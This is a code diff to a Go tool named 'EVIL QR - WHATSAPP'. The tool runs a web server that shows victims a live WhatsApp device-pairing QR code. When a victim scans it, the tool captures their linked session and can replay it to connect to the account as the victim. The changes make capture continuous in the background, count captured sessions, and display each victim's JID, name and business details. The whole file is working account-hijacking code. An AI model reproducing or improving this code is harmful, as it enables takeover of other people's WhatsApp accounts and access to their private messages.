@@ -14,6 +14,7 @@ import (
 	"path/filepath"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"go.mau.fi/whatsmeow"
@@ -39,31 +40,57 @@ type sessionMeta struct {
 	URL       string `json:"url"`
 }
 
-type attackCfg struct {
-	Port int
-	Host string
-}
-
 type attackState struct {
-	mu          sync.Mutex
-	qrCode      string
-	paired      bool
-	sessionData *store.Device
-	errorMsg    string
-	startTime   time.Time
+	mu       sync.Mutex
+	qrCode   string
+	paired   bool
+	errorMsg string
 }
 
-var currentAttack *attackState
+type serverState struct {
+	mu          sync.Mutex
+	running     bool
+	url         string
+	sessionCnt  int
+	lastSession string
+	stop        context.CancelFunc
+}
+
+var (
+	attackSt attackState
+	srvSt    serverState
+
+	newSessionNote int32
+)
 
 func Run() {
 	reader := bufio.NewReader(os.Stdin)
 	for {
 		utils.ClearTerminal()
+		srvSt.mu.Lock()
+		running := srvSt.running
+		url := srvSt.url
+		cnt := srvSt.sessionCnt
+		last := srvSt.lastSession
+		srvSt.mu.Unlock()
+
+		if note := atomic.SwapInt32(&newSessionNote, 0); note != 0 {
+			fmt.Printf("%s  ❗ NEW SESSION CAPTURED: %s%s\n\n", utils.Red, last, utils.Reset)
+		}
+
 		fmt.Printf("\n%s============ EVIL QR - WHATSAPP ============%s\n\n", utils.Blue, utils.Reset)
+		if running {
+			fmt.Printf("  %s⚡ QR Server: %s%s\n", utils.Green, url, utils.Reset)
+			fmt.Printf("  %s   Sessions captured: %d%s\n\n", utils.Yellow, cnt, utils.Reset)
+		}
 		fmt.Printf("%s[1] - Start Attack%s\n", utils.Green, utils.Reset)
-		fmt.Printf("%s[2] - List Sessions%s\n", utils.Green, utils.Reset)
-		fmt.Printf("%s[3] - Replay Session%s\n", utils.Green, utils.Reset)
-		utils.PrintReturnOption("4")
+		if running {
+			fmt.Printf("%s[2] - Stop Server%s\n", utils.Red, utils.Reset)
+		}
+		fmt.Printf("%s[3] - List Sessions%s\n", utils.Green, utils.Reset)
+		fmt.Printf("%s[4] - Replay Session%s\n", utils.Green, utils.Reset)
+		fmt.Printf("%s[5] - Clear Sessions%s\n", utils.Yellow, utils.Reset)
+		utils.PrintReturnOption("6")
 
 		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
 		input, _ := reader.ReadString('\n')
@@ -73,11 +100,23 @@ func Run() {
 		case "1":
 			doAttack(reader)
 		case "2":
+			if running {
+				stopServer()
+			} else {
+				fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
+				utils.WaitForEnter(reader)
+			}
+		case "3":
 			listSessions()
 			utils.WaitForEnter(reader)
-		case "3":
-			doReplay(reader)
 		case "4":
+			doReplay(reader)
+		case "5":
+			clearSessions(reader)
+		case "6":
+			if running {
+				stopServer()
+			}
 			return
 		default:
 			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
@@ -86,7 +125,45 @@ func Run() {
 	}
 }
 
+func stopServer() {
+	srvSt.mu.Lock()
+	cancel := srvSt.stop
+	srvSt.running = false
+	srvSt.url = ""
+	srvSt.mu.Unlock()
+	if cancel != nil {
+		cancel()
+	}
+	fmt.Printf("\n%s[+] Server stopped.%s\n", utils.Green, utils.Reset)
+	utils.PauseForInput()
+}
+
+func clearSessions(reader *bufio.Reader) {
+	fmt.Printf("\n%sClear all sessions? [y/N]: %s", utils.Red, utils.Reset)
+	input, _ := reader.ReadString('\n')
+	input = strings.TrimSpace(strings.ToLower(input))
+	if input == "y" || input == "yes" {
+		os.RemoveAll(sessionsDir)
+		os.Remove(sessionsFile)
+		os.MkdirAll(sessionsDir, 0755)
+		srvSt.mu.Lock()
+		srvSt.sessionCnt = 0
+		srvSt.lastSession = ""
+		srvSt.mu.Unlock()
+		fmt.Printf("%s[+] All sessions cleared.%s\n", utils.Green, utils.Reset)
+	} else {
+		fmt.Printf("%s[-] Cancelled.%s\n", utils.Yellow, utils.Reset)
+	}
+	utils.WaitForEnter(reader)
+}
+
 func doAttack(reader *bufio.Reader) {
+	if srvSt.running {
+		fmt.Printf("\n%s[!] Server already running! Stop it first.%s\n", utils.Yellow, utils.Reset)
+		utils.WaitForEnter(reader)
+		return
+	}
+
 	utils.ClearTerminal()
 	fmt.Printf("\n%s============ CONFIGURE ATTACK ============%s\n", utils.Blue, utils.Reset)
 
@@ -113,18 +190,24 @@ func doAttack(reader *bufio.Reader) {
 		}
 	}
 
-	launchAttack(cfg)
+	go launchAttack(cfg)
+	fmt.Printf("\n%s[+] Attack launched in background! Returning to menu...%s\n", utils.Green, utils.Reset)
+	time.Sleep(500 * time.Millisecond)
 }
 
 func launchAttack(cfg attackCfg) {
 	os.MkdirAll(sessionsDir, 0755)
 
-	currentAttack = &attackState{
-		startTime: time.Now(),
-	}
-
 	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
+
+	srvSt.mu.Lock()
+	srvSt.stop = cancel
+	srvSt.running = true
+	srvSt.sessionCnt = 0
+	srvSt.lastSession = ""
+	ip := utils.GetLocalIP()
+	srvSt.url = fmt.Sprintf("http://%s:%d", ip, cfg.Port)
+	srvSt.mu.Unlock()
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", verifyHandler)
@@ -137,50 +220,59 @@ func launchAttack(cfg attackCfg) {
 	if err != nil {
 		listener, err = net.Listen("tcp", ":0")
 		if err != nil {
-			fmt.Printf("%s[!] Failed to start HTTP server: %v%s\n", utils.Red, err, utils.Reset)
-			utils.PauseForInput()
+			srvSt.mu.Lock()
+			srvSt.running = false
+			srvSt.mu.Unlock()
 			return
 		}
 	}
 	actualAddr := listener.Addr().String()
-
 	cfg.Host, cfg.Port = parseAddr(actualAddr)
-	ip := utils.GetLocalIP()
-	attackURL := fmt.Sprintf("http://%s:%d", ip, cfg.Port)
-	localURL := fmt.Sprintf("http://127.0.0.1:%d", cfg.Port)
+	ip = utils.GetLocalIP()
+	srvSt.mu.Lock()
+	srvSt.url = fmt.Sprintf("http://%s:%d", ip, cfg.Port)
+	srvSt.mu.Unlock()
 
 	srv := &http.Server{Handler: mux}
 	go srv.Serve(listener)
 
-	start := time.Now()
-	totalTimeout := 10 * time.Minute
-	sessionCaptured := false
+	for {
+		select {
+		case <-ctx.Done():
+			srv.Close()
+			srvSt.mu.Lock()
+			srvSt.running = false
+			srvSt.mu.Unlock()
+			return
+		default:
+		}
 
-	for time.Since(start) < totalTimeout && !sessionCaptured {
 		device := newDevice()
 		cli := whatsmeow.NewClient(device, waLog.Noop)
 
 		qrChan, err := cli.GetQRChannel(ctx)
 		if err != nil {
-			fmt.Printf("%s[!] Failed to get QR channel: %v%s\n", utils.Red, err, utils.Reset)
-			break
+			srv.Close()
+			srvSt.mu.Lock()
+			srvSt.running = false
+			srvSt.mu.Unlock()
+			return
 		}
 
 		err = cli.Connect()
 		if err != nil {
-			fmt.Printf("%s[!] Failed to connect: %v%s\n", utils.Red, err, utils.Reset)
-			break
+			srv.Close()
+			srvSt.mu.Lock()
+			srvSt.running = false
+			srvSt.mu.Unlock()
+			return
 		}
 
-		currentAttack.mu.Lock()
-		currentAttack.qrCode = ""
-		currentAttack.errorMsg = ""
-		currentAttack.mu.Unlock()
-
-		fmt.Printf("\n%s[+] WhatsApp QR Jacker running%s\n", utils.Green, utils.Reset)
-		fmt.Printf("%s[+] Send this link to victim: %s%s\n", utils.Yellow, attackURL, utils.Reset)
-		fmt.Printf("%s[+] Open locally to test:  %s%s\n", utils.Yellow, localURL, utils.Reset)
-		fmt.Printf("%s[+] QR Code ready on /qr page%s\n", utils.Yellow, utils.Reset)
+		attackSt.mu.Lock()
+		attackSt.qrCode = ""
+		attackSt.errorMsg = ""
+		attackSt.paired = false
+		attackSt.mu.Unlock()
 
 		done := make(chan struct{})
 		var closeOnce sync.Once
@@ -188,42 +280,42 @@ func launchAttack(cfg attackCfg) {
 			for item := range qrChan {
 				switch item.Event {
 				case whatsmeow.QRChannelEventCode:
-					currentAttack.mu.Lock()
-					currentAttack.qrCode = item.Code
-					currentAttack.mu.Unlock()
+					attackSt.mu.Lock()
+					attackSt.qrCode = item.Code
+					attackSt.mu.Unlock()
 				case whatsmeow.QRChannelSuccess.Event:
-					currentAttack.mu.Lock()
-					currentAttack.paired = true
-					currentAttack.sessionData = cli.Store
-					currentAttack.mu.Unlock()
+					attackSt.mu.Lock()
+					attackSt.paired = true
+					attackSt.mu.Unlock()
 					saveCapturedSession(cli.Store)
-					sessionCaptured = true
+					srvSt.mu.Lock()
+					srvSt.sessionCnt++
+					srvSt.lastSession = cli.Store.ID.String()
+					srvSt.mu.Unlock()
+					atomic.StoreInt32(&newSessionNote, 1)
 					closeOnce.Do(func() { close(done) })
 					return
 				case whatsmeow.QRChannelEventError:
-					currentAttack.mu.Lock()
+					attackSt.mu.Lock()
 					if item.Error != nil {
-						currentAttack.errorMsg = item.Error.Error()
+						attackSt.errorMsg = item.Error.Error()
 					}
-					currentAttack.mu.Unlock()
+					attackSt.mu.Unlock()
 				case whatsmeow.QRChannelClientOutdated.Event:
-					currentAttack.mu.Lock()
-					currentAttack.errorMsg = "whatsmeow client outdated, please update"
-					currentAttack.mu.Unlock()
 					closeOnce.Do(func() { close(done) })
 					return
 				case whatsmeow.QRChannelTimeout.Event:
-					currentAttack.mu.Lock()
-					currentAttack.errorMsg = ""
-					currentAttack.qrCode = ""
-					currentAttack.mu.Unlock()
+					attackSt.mu.Lock()
+					attackSt.errorMsg = ""
+					attackSt.qrCode = ""
+					attackSt.mu.Unlock()
 					closeOnce.Do(func() { close(done) })
 					return
 				case whatsmeow.QRChannelErrUnexpectedEvent.Event:
-					currentAttack.mu.Lock()
-					currentAttack.errorMsg = ""
-					currentAttack.qrCode = ""
-					currentAttack.mu.Unlock()
+					attackSt.mu.Lock()
+					attackSt.errorMsg = ""
+					attackSt.qrCode = ""
+					attackSt.mu.Unlock()
 					closeOnce.Do(func() { close(done) })
 					return
 				}
@@ -233,24 +325,19 @@ func launchAttack(cfg attackCfg) {
 
 		select {
 		case <-done:
-		case <-time.After(2 * time.Minute):
+		case <-ctx.Done():
 		}
 		cli.Disconnect()
-		if sessionCaptured {
+		if ctx.Err() != nil {
 			break
 		}
-		fmt.Printf("%s[*] QR expired, generating new code...%s\n", utils.Yellow, utils.Reset)
 		time.Sleep(2 * time.Second)
 	}
 
 	srv.Close()
-
-	if sessionCaptured {
-		fmt.Printf("\n%s[+] Session captured! Use it with option 3 (Replay).%s\n", utils.Green, utils.Reset)
-	} else {
-		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)
-	}
-	utils.PauseForInput()
+	srvSt.mu.Lock()
+	srvSt.running = false
+	srvSt.mu.Unlock()
 }
 
 func verifyHandler(w http.ResponseWriter, r *http.Request) {
@@ -270,9 +357,9 @@ func qrPageHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func qrImageHandler(w http.ResponseWriter, r *http.Request) {
-	currentAttack.mu.Lock()
-	code := currentAttack.qrCode
-	currentAttack.mu.Unlock()
+	attackSt.mu.Lock()
+	code := attackSt.qrCode
+	attackSt.mu.Unlock()
 
 	if code == "" {
 		w.WriteHeader(http.StatusServiceUnavailable)
@@ -292,11 +379,11 @@ func qrImageHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func qrStatusHandler(w http.ResponseWriter, r *http.Request) {
-	currentAttack.mu.Lock()
-	paired := currentAttack.paired
-	errMsg := currentAttack.errorMsg
-	hasQR := currentAttack.qrCode != ""
-	currentAttack.mu.Unlock()
+	attackSt.mu.Lock()
+	paired := attackSt.paired
+	errMsg := attackSt.errorMsg
+	hasQR := attackSt.qrCode != ""
+	attackSt.mu.Unlock()
 
 	status := "waiting"
 	if paired {
@@ -499,7 +586,6 @@ func saveCapturedSession(device *store.Device) {
 		URL:       "-",
 	}
 	saveSessions(sessions)
-	fmt.Printf("%s[+] Session saved! ID: %s | JID: %s | Path: %s%s\n", utils.Green, id, device.ID, sessionDir, utils.Reset)
 }
 
 func loadSessionData(profileDir string) (*sessionData, error) {
@@ -621,19 +707,11 @@ func doReplay(reader *bufio.Reader) {
 		return
 	}
 
-	fmt.Printf("%s[+] Session loaded: %s%s\n", utils.Green, sd.Timestamp, utils.Reset)
-	if sd.JIDUser != "" {
-		fmt.Printf("%s[+] JID: %s@%s%s\n", utils.Green, sd.JIDUser, sd.JIDServer, utils.Reset)
-	}
-	fmt.Printf("%s[+] Connecting as victim...%s\n", utils.Yellow, utils.Reset)
-
 	device := deviceFromSession(sd)
 	cli := whatsmeow.NewClient(device, waLog.Noop)
 	cli.AutoTrustIdentity = true
 
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	defer cancel()
-
+	fmt.Printf("\n%s[*] Connecting as victim...%s\n", utils.Yellow, utils.Reset)
 	err = cli.Connect()
 	if err != nil {
 		fmt.Printf("%s[!] Replay failed: %v%s\n", utils.Red, err, utils.Reset)
@@ -641,20 +719,93 @@ func doReplay(reader *bufio.Reader) {
 		return
 	}
 
-	fmt.Printf("%s[+] Connected! Victim session is active.%s\n", utils.Green, utils.Reset)
-	fmt.Printf("%s[+] PushName: %s%s\n", utils.Yellow, sd.PushName, utils.Reset)
-	fmt.Printf("%s[+] Press Enter to disconnect...%s", utils.Green, utils.Reset)
+	jidStr := "unknown"
+	if device.ID != nil {
+		jidStr = device.ID.String()
+	}
 
-	go func() {
-		<-ctx.Done()
-		cli.Disconnect()
-	}()
+	fmt.Printf("\n%s[+] Session ACTIVE%s\n", utils.Green, utils.Reset)
+	fmt.Printf("  %sJID:%s      %s\n", utils.Blue, utils.Reset, jidStr)
+	if sd.PushName != "" {
+		fmt.Printf("  %sPushName:%s  %s\n", utils.Blue, utils.Reset, sd.PushName)
+	}
+	if sd.BusinessName != "" {
+		fmt.Printf("  %sBusiness:%s  %s\n", utils.Blue, utils.Reset, sd.BusinessName)
+	}
 
+	replayPort := pickReplayPort()
+	replayAddr := fmt.Sprintf("127.0.0.1:%d", replayPort)
+	replayURL := fmt.Sprintf("http://%s", replayAddr)
+
+	replayMux := http.NewServeMux()
+	replayMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		fmt.Fprintf(w, `<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Session Active</title>
+<style>body{font-family:sans-serif;background:#075e54;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;color:#fff}
+.card{background:#fff;color:#333;border-radius:12px;padding:40px;max-width:480px;width:90%;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
+h2{color:#075e54;margin:0 0 16px}
+.badge{display:inline-block;background:#25d366;color:#fff;padding:4px 16px;border-radius:20px;font-size:13px;margin-bottom:16px}
+.info{text-align:left;background:#f0f2f5;border-radius:8px;padding:16px;margin:16px 0;font-size:14px;line-height:1.8}
+.info strong{color:#075e54}
+.note{font-size:13px;color:#888;margin-top:16px}
+</style></head><body>
+<div class="card">
+<div class="badge">CONNECTED</div>
+<h2>WhatsApp Session Active</h2>
+<div class="info">
+<strong>JID:</strong> %s<br>
+<strong>PushName:</strong> %s<br>
+<strong>Business:</strong> %s<br>
+<strong>Platform:</strong> %s<br>
+<strong>Captured:</strong> %s
+</div>
+<p class="note">WhatsApp client is connected. Close this page when done.</p>
+</div></body></html>`,
+			jidStr, sd.PushName, sd.BusinessName, sd.Platform, sd.Timestamp)
+	})
+	replayMux.HandleFunc("/close", func(w http.ResponseWriter, r *http.Request) {
+		w.Write([]byte("ok"))
+	})
+
+	replaySrv := &http.Server{Handler: replayMux}
+	replayLis, err := net.Listen("tcp", replayAddr)
+	if err != nil {
+		replayLis, _ = net.Listen("tcp", "127.0.0.1:0")
+		if replayLis != nil {
+			replayURL = fmt.Sprintf("http://127.0.0.1:%d", replayLis.Addr().(*net.TCPAddr).Port)
+		}
+	}
+	if replayLis != nil {
+		go replaySrv.Serve(replayLis)
+	}
+
+	browser := detectBrowser()
+	if browser != "" {
+		exec.Command(browser, "--new-window", replayURL).Start()
+		fmt.Printf("\n%s[+] Opened browser to: %s%s\n", utils.Green, replayURL, utils.Reset)
+	}
+
+	fmt.Printf("\n%s[+] Session connected. Opened browser with session info.%s\n", utils.Green, utils.Reset)
+	fmt.Printf("\n%s[+] Press Enter to disconnect the session...%s", utils.Green, utils.Reset)
 	reader.ReadString('\n')
-	cancel()
 	cli.Disconnect()
+	if replayLis != nil {
+		replaySrv.Close()
+		replayLis.Close()
+	}
 	fmt.Printf("%s[+] Disconnected.%s\n", utils.Yellow, utils.Reset)
-	utils.WaitForEnter(reader)
+}
+
+func pickReplayPort() int {
+	for port := 9190; port < 9200; port++ {
+		lis, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
+		if err == nil {
+			lis.Close()
+			return port
+		}
+	}
+	return 9190
 }
 
 func detectBrowser() string {
@@ -770,6 +921,11 @@ func (m *memPreKeyStore) UploadedPreKeyCount(ctx context.Context) (int, error) {
 	m.mu.Lock()
 	defer m.mu.Unlock()
 	return len(m.keys), nil
+}
+
+type attackCfg struct {
+	Port int
+	Host string
 }
 
 func newDevice() *store.Device {
